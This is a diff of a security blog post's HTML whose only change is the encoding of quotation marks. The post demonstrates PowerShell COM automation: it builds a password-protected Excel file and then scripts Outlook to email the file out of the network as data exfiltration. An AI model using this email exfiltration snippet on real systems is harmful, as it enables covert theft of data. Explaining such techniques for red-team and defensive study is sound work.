@@ -137,14 +137,14 @@ PS C:\&gt; $excel.Visible = $true
 <p>As the next step we can add a <code>Workbook</code> and write some data to a specific <code>Cell</code>.</p>
 <pre tabindex="0"><code>PS C:\&gt; $workbook = $excel.Workbooks().Add()
 PS C:\&gt; $cell = $workbook.ActiveSheet.Cells(1,1)
-PS C:\&gt; $cell.Value = &quot;Here goes the secret message!&quot;
-PS C:\&gt; $workbook.Password = &quot;Test&quot;
+PS C:\&gt; $cell.Value = &#34;Here goes the secret message!&#34;
+PS C:\&gt; $workbook.Password = &#34;Test&#34;
 </code></pre><p>This is how the result looks like:</p>
 <p><img src="/blog/images/2021/excel.PNG" alt="Using Excel Automation"></p>
 <p>The above images shows the created Excel document. <em>Remember that we set <code>Visible=$true</code> - this to demo what is possible, during an attack an adversary would not show the user interface.</em></p>
 <h3 id="saving-the-document">Saving the document</h3>
 <p>Using the <code>SaveAs</code> function the document can be stored.</p>
-<pre tabindex="0"><code>PS C:\&gt; $workbook.SaveAs(&quot;EmbraceTheRed&quot;)
+<pre tabindex="0"><code>PS C:\&gt; $workbook.SaveAs(&#34;EmbraceTheRed&#34;)
 </code></pre><h3 id="closing-the-document">Closing the document</h3>
 <p>Finally, Excel can be closed.</p>
 <pre tabindex="0"><code>PS C:\&gt; $workbook.Close()
@@ -152,13 +152,13 @@ PS C:\&gt; $excel.Quit()
 </code></pre><h3 id="data-exfiltration---emailing-the-document">Data Exfiltration - Emailing the document</h3>
 <p>As said all most of Office is implemented using COM interfaces, so we can automate <code>Outlook</code> as well.</p>
 <p>In order to send the created <code>Excel</code> document out of the network, an adversary could use <code>Outlook</code> for instance.</p>
-<pre tabindex="0"><code>$to = &quot;&quot;
-$subject = &quot;Secret Excel Document&quot;
-$content = &quot;Important message attached.&quot;
+<pre tabindex="0"><code>$to = &#34;&#34;
+$subject = &#34;Secret Excel Document&#34;
+$content = &#34;Important message attached.&#34;
 
 $outlook = New-Object -com Outlook.Application
 $mail = $outlook.CreateItem(0)
-$mail.Attachments.Add(&quot;EmbraceTheRed&quot;)
+$mail.Attachments.Add(&#34;EmbraceTheRed&#34;)
 $mail.subject = $subject
 $mail.To = $to
 $mail.HTMLBody = $content
